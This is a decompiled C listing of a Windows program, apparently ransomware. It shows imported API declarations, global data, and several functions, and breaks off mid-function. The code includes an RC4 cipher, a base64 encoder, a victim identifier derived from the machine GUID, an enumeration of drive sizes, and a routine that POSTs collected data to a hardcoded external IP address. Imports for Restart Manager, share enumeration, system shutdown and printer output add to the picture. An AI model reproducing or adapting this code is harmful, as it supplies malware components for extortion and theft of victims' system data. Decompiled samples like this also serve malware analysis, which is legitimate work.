// extern int (__stdcall *LCMapStringW)(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern HRSRC (__stdcall *FindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern BOOL (__stdcall *GetComputerNameW)(LPWSTR lpBuffer, LPDWORD nSize);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetDiskFreeSpaceExW)(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern DWORD (__stdcall *NetGetJoinInformation)(LPCWSTR lpServer, LPWSTR *lpNameBuffer, PNETSETUP_JOIN_STATUS BufferType);
// extern DWORD (__stdcall *NetApiBufferFree)(LPVOID Buffer);
// extern DWORD (__stdcall *NetShareEnum)(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern DWORD (__stdcall *RmGetList)(DWORD dwSessionHandle, UINT *pnProcInfoNeeded, UINT *pnProcInfo, RM_PROCESS_INFO rgAffectedApps[], LPDWORD lpdwRebootReasons);
// extern DWORD (__stdcall *RmStartSession)(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[]);
// extern DWORD (__stdcall *RmEndSession)(DWORD dwSessionHandle);
// extern DWORD (__stdcall *RmRegisterResources)(DWORD dwSessionHandle, UINT nFiles, LPCWSTR rgsFileNames[], UINT nApplications, RM_UNIQUE_PROCESS rgApplications[], UINT nServices, LPCWSTR rgsServiceNames[]);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
// extern HRESULT (__stdcall *SHGetFolderPathW)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
// extern void (__stdcall *SHChangeNotify)(LONG wEventId, UINT uFlags, LPCVOID dwItem1, LPCVOID dwItem2);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern void (__stdcall *PathRemoveExtensionW)(LPWSTR pszPath);
// extern LPWSTR (__stdcall *PathAddBackslashW)(LPWSTR pszPath);
// extern PWSTR (__stdcall *StrRChrW)(PCWSTR pszStart, PCWSTR pszEnd, WCHAR wMatch);
// extern BOOL (__stdcall *PathRemoveFileSpecW)(LPWSTR pszPath);
// extern PWSTR (__stdcall *StrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);
// extern LPWSTR (__stdcall *PathFindExtensionW)(LPCWSTR pszPath);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern BOOL (__stdcall *SystemParametersInfoW)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern int (__stdcall *DrawTextW)(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern int (*wsprintfW)(LPWSTR, LPCWSTR, ...);
// extern BOOL (__stdcall *HttpSendRequestW)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern HINTERNET (__stdcall *InternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
// extern HINTERNET (__stdcall *HttpOpenRequestW)(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern HINTERNET (__stdcall *InternetConnectW)(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *OpenPrinterW)(LPWSTR pPrinterName, LPHANDLE phPrinter, LPPRINTER_DEFAULTSW pDefault);
// extern BOOL (__stdcall *ClosePrinter)(HANDLE hPrinter);
// extern BOOL (__stdcall *WritePrinter)(HANDLE hPrinter, LPVOID pBuf, DWORD cbBuf, LPDWORD pcWritten);
// extern BOOL (__stdcall *StartPagePrinter)(HANDLE hPrinter);
// extern DWORD (__stdcall *StartDocPrinterW)(HANDLE hPrinter, DWORD Level, LPBYTE pDocInfo);
// extern BOOL (__stdcall *EnumPrintersW)(DWORD Flags, LPWSTR Name, DWORD Level, LPBYTE pPrinterEnum, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern int (__stdcall *WSACleanup)();
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern INT (__stdcall *WSAAddressToStringW)(LPSOCKADDR lpsaAddress, DWORD dwAddressLength, LPWSAPROTOCOL_INFOW lpProtocolInfo, LPWSTR lpszAddressString, LPDWORD lpdwAddressStringLength);
// extern int (__stdcall *getsockopt)(SOCKET s, int level, int optname, char *optval, int *optlen);
// extern u_long (__stdcall *htonl)(u_long hostlong);
// extern SOCKET (__stdcall *WSASocketW)(int af, int type, int protocol, LPWSAPROTOCOL_INFOW lpProtocolInfo, GROUP g, DWORD dwFlags);
// extern u_long (__stdcall *ntohl)(u_long netlong);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *WSAIoctl)(SOCKET s, DWORD dwIoControlCode, LPVOID lpvInBuffer, DWORD cbInBuffer, LPVOID lpvOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbBytesReturned, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
// extern int (__stdcall *bind)(SOCKET s, const struct sockaddr *name, int namelen);
// extern unsigned int (__stdcall *inet_addr)(const char *cp);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *setsockopt)(SOCKET s, int level, int optname, const char *optval, int optlen);
// extern int (__stdcall *WSAGetLastError)();
// extern NTSTATUS (__stdcall *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
// extern ULONG (__stdcall *RtlRandomEx)(PULONG Seed);
// extern NTSTATUS (__stdcall *NtShutdownSystem)(SHUTDOWN_ACTION Action);
// extern NTSTATUS (__stdcall *RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN NewValue, BOOLEAN ForThread, PBOOLEAN OldValue);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoSetProxyBlanket)(IUnknown *pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR *pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
// extern HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved);
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
const IID rclsid = { 1167128593u, 7482u, 4560u, { 137u, 31u, 0u, 170u, 0u, 75u, 46u, 36u } }; // idb
const IID stru_4243F0 = { 1732994712u, 61074u, 4560u, { 173u, 113u, 0u, 192u, 79u, 216u, 253u, 255u } }; // idb
const IID riid = { 3692209799u, 29567u, 4559u, { 136u, 77u, 0u, 170u, 0u, 75u, 46u, 36u } }; // idb
const IID stru_424410 = { 1152165492u, 59644u, 4560u, { 160u, 124u, 0u, 192u, 79u, 182u, 136u, 32u } }; // idb
void *type_info::`vftable' = &sub_41047A; // weak
void *std::bad_alloc::`vftable' = &unknown_libname_3; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_3; // weak
_UNKNOWN unk_427398; // weak
_UNKNOWN unk_4273B0; // weak
char byte_42A128[] = { 'A' }; // weak
char byte_42A170[] = { '@' }; // weak
_UNKNOWN unk_42A270; // weak
char byte_42A370[64] =
{
  '\x80',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
const char Str2 = '\xEF'; // idb
void *CAttr_Data<CAttrResident>::`vftable' = &sub_40C3D0; // weak
void *CSList<tagDataRun_Entry>::`vftable' = &sub_40EA90; // weak
void *CAttr_FileName::`vftable' = &sub_40F0BC; // weak
void *CAttr_AttrList<CAttrNonResident>::`vftable' = &sub_40EF70; // weak
void *CAttr_IndexRoot::`vftable' = &sub_40F0C4; // weak
void *CAttrNonResident::`vftable' = &sub_40C6E0; // weak
void *CAttr_AttrList<CAttrResident>::`vftable' = &sub_40EFD0; // weak
void *CAttr_IndexAlloc::`vftable' = &sub_40CE00; // weak
void *CIndexEntry::`vftable' = &sub_40CD10; // weak
void *CNTFSVolume::`vftable' = &sub_40E070; // weak
void *CAttr_StdInfo::`vftable' = &sub_40CB10; // weak
void *CFileName::`vftable' = &sub_40CB40; // weak
void *CSList<CIndexEntry>::`vftable' = &sub_40EA60; // weak
void *CAttrBase::`vftable' = &sub_40C3A0; // weak
void *CSList<CAttrBase>::`vftable' = &sub_40EAC0; // weak
void *CAttr_IndexRoot::`vftable' = &sub_40CDC0; // weak
void *CIndexBlock::`vftable' = &sub_40CD70; // weak
void *CAttr_Bitmap<CAttrResident>::`vftable' = &sub_40F080; // weak
void *CAttr_FileName::`vftable' = &sub_40CC70; // weak
void *CAttr_Bitmap<CAttrNonResident>::`vftable' = &sub_40F010; // weak
void *CAttr_VolInfo::`vftable' = &sub_40CB10; // weak
void *CAttrResident::`vftable' = &sub_40C3D0; // weak
void *CAttr_Data<CAttrNonResident>::`vftable' = &sub_40C6E0; // weak
void *CFileRecord::`vftable' = &sub_40D0C0; // weak
void *CSList<CFileRecord>::`vftable' = &sub_40EA30; // weak
void *CAttr_VolName::`vftable' = &sub_40CCC0; // weak
__int128 xmmword_42BC80 = 1i64; // weak
__int128 xmmword_42BC90 = 2i64; // weak
__int128 xmmword_42BCA0 = 3i64; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_2, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_2, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
int dword_42F004 = 1; // weak
wchar_t *off_42F0F8 = L"         (((((                  H"; // weak
int dword_42F738 = -2; // weak
HANDLE hConsoleOutput = (HANDLE)0xFFFFFFFE; // idb
WCHAR szHeaders[] = L"Connection: keep-alive; Accept-Encoding: gzip, deflate, br; Content-Type: text/plain; charset=utf-8"; // idb
HANDLE hObject = (HANDLE)0xFFFFFFFF; // idb
int (__cdecl *off_42F93C)(_DWORD) = &sub_403BD0; // weak
int (__cdecl *off_42F940)(_DWORD) = &j__free; // weak
int (*off_42F944[2])() = { &sub_403BF0, &type_info::`vftable' }; // weak
union _SLIST_HEADER ListHead = { 0ui64 }; // idb
int dword_42FD48 = 0; // weak
int dword_42FD50 = 0; // weak
int dword_430078; // weak
int dword_43011C; // weak
int dword_430120; // weak
int dword_430124; // weak
void *dword_43033C; // idb
void *dword_430340; // idb
int dword_43034C; // weak
int dword_430354; // weak
int dword_430358; // weak
_UNKNOWN unk_43035C; // weak
_onexit_table_t stru_430360; // idb
int dword_430378; // weak
struct __crt_locale_data *dword_430398; // idb
int dword_4303A0[124]; // weak
int dword_4305A0; // weak
struct __crt_multibyte_data *dword_430704; // idb
HANDLE dword_430810; // idb
LPWSTR Parameter; // idb
char byte_43083C; // weak
char byte_43083D; // weak
char byte_43083E; // weak
char byte_43083F; // weak
_UNKNOWN unk_430840; // weak
LPCSTR pBuf; // idb
SHUTDOWN_ACTION Action; // idb
PCWSTR lpServiceName; // idb
int dword_4308CC; // weak
int dword_4308D0; // weak
int dword_4308D4; // weak
int dword_4308D8; // weak
int dword_4308DC; // weak
int dword_4308E0; // weak
int dword_4308E4; // weak
PCWSTR lpString2; // idb
int dword_4308EC; // weak
int dword_4308F0; // weak
int dword_4308F4; // weak
int dword_4308F8; // weak
int dword_4308FC; // weak
PCWSTR pszSrch; // idb
int dword_430904; // weak
int dword_430908; // weak
int dword_43090C; // weak
int dword_430910; // weak
PCWSTR dword_430914; // idb
unsigned __int8 byte_430918[32]; // weak
int dword_430938; // weak
int dword_43093C; // weak
int dword_430940; // weak
PCWSTR lpString; // idb
_UNKNOWN unk_430948; // weak
int dword_4309C8; // weak
int dword_4309CC; // weak
int dword_4309D0; // weak
int dword_4309D4; // weak
int dword_4309D8; // weak
int dword_4309DC; // weak
int dword_4309E0; // weak
PCWSTR dword_4309E4; // idb
PCWSTR lpMem; // idb
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
LPCVOID lpBuffer; // idb
HANDLE hMutex; // idb
ULONG Seed; // idb
int dword_430A10; // weak
HANDLE CompletionPort; // idb
int dword_430A18; // weak
int dword_430A1C; // weak
__int64 qword_430A20; // weak
HANDLE DuplicateTokenHandle; // idb
HANDLE hHeap; // idb
int dword_430A30; // weak
int dword_430A34; // weak
HANDLE ExistingCompletionPort; // idb
LPVOID dword_430A3C; // idb
HANDLE hSemaphore; // idb
HANDLE hHandle; // idb
int dword_430A48; // weak
int dword_430A4C; // weak
int dword_430A50; // weak
struct _RTL_CRITICAL_SECTION stru_430A54; // idb
int (__stdcall *dword_430A6C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_UNKNOWN unk_430A70; // weak
_UNKNOWN unk_430A78; // weak
_UNKNOWN unk_430A84; // weak
_UNKNOWN unk_430A88; // weak


//----- (00401000) --------------------------------------------------------
LPWSTR *sub_401000()
{
  const WCHAR *CommandLineW; // eax
  LPWSTR *result; // eax
  LPWSTR *v2; // edi
  int v3; // esi
  SIZE_T v4; // edi
  WCHAR *i; // eax
  const WCHAR *lpString2; // [esp+4h] [ebp-8h]
  int pNumArgs; // [esp+8h] [ebp-4h] BYREF

  pNumArgs = 0;
  CommandLineW = GetCommandLineW();
  result = CommandLineToArgvW(CommandLineW, &pNumArgs);
  v2 = result;
  if ( pNumArgs > 1 )
  {
    v3 = 1;
    while ( 1 )
    {
      result = (LPWSTR *)lstrcmpiW(v2[v3], L"-path");
      if ( !result )
        break;
      if ( ++v3 >= pNumArgs )
        return result;
    }
    result = (LPWSTR *)v2[v3 + 1];
    lpString2 = (const WCHAR *)result;
    if ( result )
    {
      v4 = 2 * lstrlenW((LPCWSTR)result) + 4;
      for ( i = (WCHAR *)HeapAlloc(hHeap, 8u, v4); !i; i = (WCHAR *)HeapAlloc(hHeap, 8u, v4) )
        Sleep(0x64u);
      Parameter = i;
      lstrcpyW(i, lpString2);
      return (LPWSTR *)PathAddBackslashW(Parameter);
    }
  }
  return result;
}

//----- (004010D0) --------------------------------------------------------
int __usercall sub_4010D0@<eax>(int a1@<edx>, _BYTE *a2@<ecx>, int a3)
{
  int v4; // ebx
  int v5; // edx
  int v6; // edi
  _BYTE *v7; // esi
  int v8; // edi
  unsigned int v9; // edx
  unsigned int v10; // eax
  char v11; // cl
  int v13; // [esp+10h] [ebp-4h]

  v4 = 0;
  v5 = a3;
  v6 = (int)a2;
  v13 = a1;
  v7 = a2;
  if ( a3 - 2 > 0 )
  {
    v8 = a1 + 2;
    v9 = (a3 - 3) / 3u + 1;
    v4 = 3 * v9;
    do
    {
      v10 = *(unsigned __int8 *)(v8 - 2);
      v8 += 3;
      *v7 = byte_42A128[v10 >> 2];
      v7[1] = byte_42A128[(*(unsigned __int8 *)(v8 - 4) >> 4) | (16 * (*(_BYTE *)(v8 - 5) & 3))];
      v7[2] = byte_42A128[(4 * (*(_BYTE *)(v8 - 4) & 0xF)) | (*(unsigned __int8 *)(v8 - 3) >> 6)];
      v7[3] = byte_42A128[*(_BYTE *)(v8 - 3) & 0x3F];
      v7 += 4;
      --v9;
    }
    while ( v9 );
    v5 = a3;
    v6 = (int)a2;
    a1 = v13;
  }
  if ( v4 < v5 )
  {
    *v7 = byte_42A128[*(unsigned __int8 *)(v4 + a1) >> 2];
    if ( v4 == v5 - 1 )
    {
      v11 = 61;
      v7[1] = byte_42A128[16 * (*(_BYTE *)(v4 + v13) & 3)];
    }
    else
    {
      v7[1] = byte_42A128[(16 * (*(_BYTE *)(v4 + v13) & 3)) | (*(unsigned __int8 *)(v4 + v13 + 1) >> 4)];
      v11 = byte_42A128[4 * (*(_BYTE *)(v4 + v13 + 1) & 0xF)];
    }
    v7[2] = v11;
    v7[3] = 61;
    v7 += 4;
  }
  *v7 = 0;
  return (int)&v7[-v6 + 1];
}

//----- (004011F0) --------------------------------------------------------
void *sub_4011F0()
{
  return &unk_430A70;
}

//----- (00401200) --------------------------------------------------------
int __cdecl sub_401200(int *a1, int a2, int a3)
{
  int *v3; // eax
  int result; // eax

  v3 = (int *)sub_4011F0();
  result = sub_4148D6(*v3, v3[1], a1, 0x7FFFFFFF, a2, 0, (int)&a3);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (00401240) --------------------------------------------------------
int __cdecl sub_401240(int *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int result; // eax

  v3 = sub_4011F0();
  result = sub_4148B2(*v3 | 1, v3[1], a1, -1, a2, 0, (int)&a3);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (00401280) --------------------------------------------------------
int __cdecl sub_401280(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // ebx
  unsigned int i; // eax
  int v6; // edi
  unsigned int j; // esi
  char v8; // dl
  int v9; // edi
  char v10; // cl
  int result; // eax
  int v12; // esi
  char v13; // dl
  int v14; // ecx
  char Dst[256]; // [esp+Ch] [ebp-104h] BYREF
  int v16; // [esp+10Ch] [ebp-4h]
  int v17; // [esp+11Ch] [ebp+Ch]

  v4 = v3;
  memset(Dst, 0, sizeof(Dst));
  for ( i = 0; i < 0x100; ++i )
    Dst[i] = i;
  LOBYTE(v6) = 0;
  for ( j = 0; j < 0x100; ++j )
  {
    v8 = Dst[j];
    v6 = (unsigned __int8)(v6 + *(_BYTE *)((j & 0x1F) + v4) + v8);
    Dst[j] = Dst[v6];
    Dst[v6] = v8;
  }
  v9 = a3;
  v10 = 0;
  result = 0;
  if ( a3 )
  {
    v12 = a1;
    v17 = a2 - a1;
    do
    {
      ++v12;
      v13 = Dst[(unsigned __int8)(result + 1)];
      v14 = (unsigned __int8)(v10 + v13);
      v16 = v14;
      Dst[(unsigned __int8)(result + 1)] = Dst[v14];
      Dst[v14] = v13;
      v10 = v16;
      *(_BYTE *)(v12 - 1) = *(_BYTE *)(v17 + v12 - 1) ^ Dst[(unsigned __int8)(v13 + Dst[(unsigned __int8)(result + 1)])];
      result = (unsigned __int8)(result + 1);
      --v9;
    }
    while ( v9 );
  }
  return result;
}
// 40129A: variable 'v3' is possibly undefined
// 401280: using guessed type char Dst[256];

//----- (00401380) --------------------------------------------------------
int *sub_401380()
{
  wchar_t *j; // edi
  DWORD v1; // eax
  int v2; // ebx
  int v3; // ecx
  UINT DriveTypeW; // eax
  wchar_t *v5; // eax
  DWORD LogicalDrives; // [esp+10h] [ebp-228h]
  int v8; // [esp+14h] [ebp-224h]
  int v9; // [esp+18h] [ebp-220h]
  int *i; // [esp+1Ch] [ebp-21Ch]
  union _ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+20h] [ebp-218h] BYREF
  union _ULARGE_INTEGER TotalNumberOfBytes; // [esp+28h] [ebp-210h] BYREF
  int v13; // [esp+30h] [ebp-208h]
  int v14; // [esp+34h] [ebp-204h]
  WCHAR RootPathName[256]; // [esp+38h] [ebp-200h] BYREF

  LogicalDrives = GetLogicalDrives();
  for ( i = (int *)HeapAlloc(hHeap, 8u, 0x4000u); !i; i = (int *)HeapAlloc(hHeap, 8u, 0x4000u) )
    Sleep(0x64u);
  for ( j = (wchar_t *)HeapAlloc(hHeap, 8u, 0x2000u); !j; j = (wchar_t *)HeapAlloc(hHeap, 8u, 0x2000u) )
    Sleep(0x64u);
  v1 = LogicalDrives;
  v2 = 65;
  v9 = 0;
  v8 = 26;
  v3 = 26;
  do
  {
    if ( (v1 & 1) != 0 )
    {
      wsprintfW(RootPathName, L"\\\\?\\%hc:\\", v2);
      DriveTypeW = GetDriveTypeW(RootPathName);
      if ( (DriveTypeW == 3 || DriveTypeW == 2)
        && GetDiskFreeSpaceExW(RootPathName, 0, &TotalNumberOfBytes, &TotalNumberOfFreeBytes) )
      {
        v14 = TotalNumberOfFreeBytes.QuadPart >> 20;
        TotalNumberOfFreeBytes.QuadPart >>= 20;
        v13 = TotalNumberOfBytes.QuadPart >> 20;
        TotalNumberOfBytes.QuadPart >>= 20;
        v9 += sub_401200(
                (int *)&j[v9],
                (int)L"{\"disk_name\": \"%hc\", \"disk_type\": \"%s\", \"free_size\": \"%llu\", \"total_size\": \"%llu\"},",
                v2);
      }
      v1 = LogicalDrives;
      v3 = v8;
    }
    v1 >>= 1;
    ++v2;
    --v3;
    LogicalDrives = v1;
    v8 = v3;
  }
  while ( v3 );
  v5 = wcsrchr(j, 0x2Cu);
  if ( v5 )
    *v5 = 0;
  sub_401200(i, (int)L"\"disks_info\": [%s]", (int)j);
  HeapFree(hHeap, 0, j);
  return i;
}
// 42A3E8: using guessed type wchar_t aDiskNameHcDisk[84];
// 42A490: using guessed type wchar_t aDisksInfoS[19];

//----- (00401550) --------------------------------------------------------
char __thiscall sub_401550(_BYTE *this)
{
  LSTATUS v1; // eax
  unsigned int v2; // eax
  BYTE *v3; // ebx
  unsigned __int16 v4; // di
  unsigned __int16 v5; // dx
  BYTE *v6; // edx
  unsigned __int16 v7; // di
  unsigned __int16 v8; // dx
  bool v9; // zf
  BYTE *v10; // ebx
  unsigned __int16 v11; // di
  unsigned __int16 v12; // dx
  _BYTE *v13; // ebx
  BYTE Data[256]; // [esp+4h] [ebp-114h] BYREF
  DWORD cbData; // [esp+104h] [ebp-14h] BYREF
  _BYTE *v17; // [esp+108h] [ebp-10h]
  unsigned int v18; // [esp+10Ch] [ebp-Ch] BYREF
  HKEY phkResult; // [esp+110h] [ebp-8h] BYREF
  DWORD Type; // [esp+114h] [ebp-4h] BYREF

  v17 = this;
  Type = 1;
  cbData = 256;
  v1 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, 0x101u, &phkResult);
  if ( !v1 )
  {
    if ( RegQueryValueExW(phkResult, L"MachineGuid", 0, &Type, Data, &cbData) )
    {
      LOBYTE(v1) = RegCloseKey(phkResult);
    }
    else
    {
      RegCloseKey(phkResult);
      v2 = -1;
      v3 = Data;
      do
      {
        v4 = *(_WORD *)v3;
        v3 += 2;
        v5 = v4 | 0x20;
        if ( (unsigned __int16)(v4 - 65) > 0x19u )
          v5 = v4;
        v2 = v5 + __ROR4__(v2, 13);
      }
      while ( v5 );
      v6 = Data;
      do
      {
        v7 = *(_WORD *)v6;
        Type = (DWORD)(v6 + 2);
        v8 = v7 | 0x20;
        if ( (unsigned __int16)(v7 - 65) > 0x19u )
          v8 = v7;
        v2 = v8 + __ROR4__(v2, 13);
        v9 = v8 == 0;
        v6 = (BYTE *)Type;
      }
      while ( !v9 );
      v10 = Data;
      do
      {
        v11 = *(_WORD *)v10;
        v10 += 2;
        v12 = v11 | 0x20;
        if ( (unsigned __int16)(v11 - 65) > 0x19u )
          v12 = v11;
        v2 = v12 + __ROR4__(v2, 13);
      }
      while ( v12 );
      v13 = v17;
      v18 = v2;
      phkResult = (HKEY)_byteswap_ulong(v2);
      sub_4010D0((int)&v18, v17, 8);
      v13[9] = 0;
      LOBYTE(v1) = *v13;
      if ( *v13 )
      {
        do
        {
          if ( (_BYTE)v1 == 43 || (_BYTE)v1 == 47 || (_BYTE)v1 == 61 )
            *v13 = 122;
          LOBYTE(v1) = *++v13;
        }
        while ( (_BYTE)v1 );
      }
    }
  }
  return v1;
}

//----- (004016B0) --------------------------------------------------------
int __cdecl sub_4016B0(int a1, LPVOID lpOptional, DWORD dwOptionalLength)
{
  int v3; // esi
  void *v4; // eax
  void *v5; // edi
  void *v6; // eax
  void *v7; // ebx
  int v8; // eax
  void *hRequest; // [esp+8h] [ebp-4h]

  v3 = 0;
  v4 = InternetOpenW(L"AppleWebKit/587.38 (KHTML, like Gecko)", 0, 0, 0, 0);
  v5 = v4;
  if ( v4 )
  {
    v6 = InternetConnectW(v4, L"79.133.51.208", 0x63AEu, 0, 0, 3u, 0, 0);
    v7 = v6;
    if ( v6 )
    {
      hRequest = HttpOpenRequestW(v6, L"POST", L"/r1.php", 0, 0, 0, 0, 0);
      if ( hRequest )
      {
        v8 = lstrlenW(szHeaders);
        if ( HttpSendRequestW(hRequest, szHeaders, v8, lpOptional, dwOptionalLength) )
          v3 = 1;
        InternetCloseHandle(hRequest);
      }
      InternetCloseHandle(v7);
    }
    InternetCloseHandle(v5);
  }
  return v3;
}

//----- (00401760) --------------------------------------------------------
BOOL __usercall sub_401760@<eax>(void *a1@<ebp>)
{
  HANDLE CurrentProcess; // eax
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // esi
  HANDLE v4; // eax
  int *v5; // edi
  CHAR *v6; // esi
  SIZE_T v7; // edi
  int v8; // eax
  int v9; // ecx
  BYTE v11[256]; // [esp-3E0h] [ebp-3ECh] BYREF
  WCHAR v12[128]; // [esp-2E0h] [ebp-2ECh] BYREF
  WCHAR v13[128]; // [esp-1E0h] [ebp-1ECh] BYREF
  _BYTE v14[128]; // [esp-E0h] [ebp-ECh] BYREF
  char v15[33]; // [esp-60h] [ebp-6Ch] BYREF
  enum _NETSETUP_JOIN_STATUS v16; // [esp-28h] [ebp-34h] BYREF
  DWORD v17; // [esp-24h] [ebp-30h] BYREF
  DWORD v18; // [esp-20h] [ebp-2Ch] BYREF
  DWORD v19; // [esp-1Ch] [ebp-28h] BYREF
  int *v20; // [esp-18h] [ebp-24h]
  DWORD JoinInformation; // [esp-14h] [ebp-20h]
  LPWSTR v22; // [esp-10h] [ebp-1Ch] BYREF
  DWORD i; // [esp-Ch] [ebp-18h] BYREF
  int v24; // [esp-8h] [ebp-14h] BYREF
  void *v25[4]; // [esp-4h] [ebp-10h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v25[1] = a1;
  v25[2] = retaddr;
  v22 = 0;
  v18 = 128;
  v17 = 128;
  memset(v14, 0, sizeof(v14));
